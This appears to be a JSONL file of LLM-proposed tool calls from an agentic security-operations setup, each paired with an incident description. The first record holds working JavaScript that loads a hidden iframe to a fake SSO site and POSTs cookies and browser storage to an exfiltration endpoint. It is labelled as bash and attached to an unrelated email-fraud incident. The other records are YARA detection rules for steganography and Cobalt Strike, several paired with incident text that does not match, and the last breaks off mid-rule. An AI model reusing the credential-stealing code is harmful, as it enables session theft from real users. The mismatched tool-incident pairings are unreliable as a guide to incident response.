{"proposal": {"tool_id": "T7_code_analyzer", "arguments": {"code_snippet": "function extractCredentials() {
  let iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'https://corp-login.fake-sso.net';
  document.body.appendChild(iframe);
  setTimeout(() => {
    let payload = {
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      session: JSON.stringify(sessionStorage)
    };
    fetch('https://exfil.datapipe.io/stolen', {
      method: 'POST',
      body: JSON.stringify(payload)
    });
  }, 2000);
}", "language": "bash"}, "justification": "LLM proposed: T7_code_analyzer", "phase": "analyze"}, "incident_context": {"incident_id": "INC-2026-0703", "description": "CFO reported suspicious email appearing to be from the CEO requesting an urgent wire transfer. Email originated from external address using display name spoofing. No links or attachments present; pure social engineering attempt (BEC).", "config": "agenticcyops"}}

{"proposal": {"tool_id": "T15_editor_test", "arguments": {"rule_type": "yara", "action": "validate", "rule_content": "rule Suspicious_Large_PNG {
    meta:
        description = "Detects PNG files larger than 50MB which may be used for steganography"
        author = "SOC Team"
        severity = 3
    strings:
        $png_header = {89 50 4E 47 0D 0A 1A 0A}
        $large_file = "" condition:
        $png_header at 0 and filesize > 50000000
}"}, "justification": "LLM proposed: T15_editor_test", "phase": "report", "action": "validate"}, "incident_context": {"incident_id": "INC-2026-0718", "description": "Suspected steganographic exfiltration detected. Compromised workstation uploading unusually large image files (50-80 MB PNG files) to external image hosting service. Statistical analysis of image files shows anomalous LSB patterns consistent with data embedding.", "config": "agenticcyops"}}

{"proposal": {"tool_id": "T15_editor_test", "arguments": {"rule_type": "yara", "action": "validate", "rule_content": "rule CobaltStrike_Beacon_Payload {
    meta:
        description = "Detects memory patterns of Cobalt Strike beacon"
        author = "SOC_Team"
        severity = "critical"
    strings:
        $a = { 60 8B ?? 3C 05 ?? ?? ?? ?? 74 ?? 8B ?? 3C 05 ?? ?? ?? ?? }
        $b = "Mozilla/5.0 (Windows NT" wide ascii
        $c = "GET /news.php?" wide ascii
    condition:
        all of them
}"}, "justification": "LLM proposed: T15_editor_test", "phase": "report", "action": "validate"}, "incident_context": {"incident_id": "INC-AP15-V1", "description": "Credential stuffing activity detected from 10.0.5.14 targeting domain controller 10.0.8.200. Multiple failed Kerberos TGT requests (Event ID 4768) observed over 8-minute window. Source IP is associated with external partner VPN gateway. Recommend blocking source IP at perimeter firewall.", "config": "agenticcyops"}}

{"proposal": {"tool_id": "T15_editor_test", "arguments": {"rule_type": "yara", "action": "validate", "rule_content": "rule CobaltStrike_Beacon_Domain {
    meta:
        description = "Detects known Cobalt Strike C2 beaconing domain pattern"
        author = "SOC_Team"
        tlp = "amber"
    strings:
        $beacon_pattern = /https:\/\/[^\/]+\/[a-z]{4}\/[a-z]{6,8}\//
    condition:
        $beacon_pattern
}"}, "justification": "LLM proposed: T15_editor_test", "phase": "report", "action": "validate"}, "incident_context": {"incident_id": "INC-AP15-V2", "description": "Credential stuffing activity detected from 10.0.5.14 targeting domain controller 10.0.8.200. Multiple failed Kerberos TGT requests (Event ID 4768) observed over 8-minute window. Source IP is associated with external partner VPN gateway. Recommend blocking source IP at perimeter firewall.", "config": "agenticcyops"}}

{"proposal": {"tool_id": "T15_editor_test", "arguments": {"rule_type": "yara", "action": "validate", "rule_content": "rule CobaltStrike_Beacon_Pattern {
    meta:
        description = "Detects Cobalt Strike beaconing behavior based on network patterns"
        author = "SOC Team"
        severity = "critical"
    strings:
        $a = { 2d 31 2e 30 2e 30 2e 34 }
        $b = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" 
        $c = "Accept: */*" 
    condition:
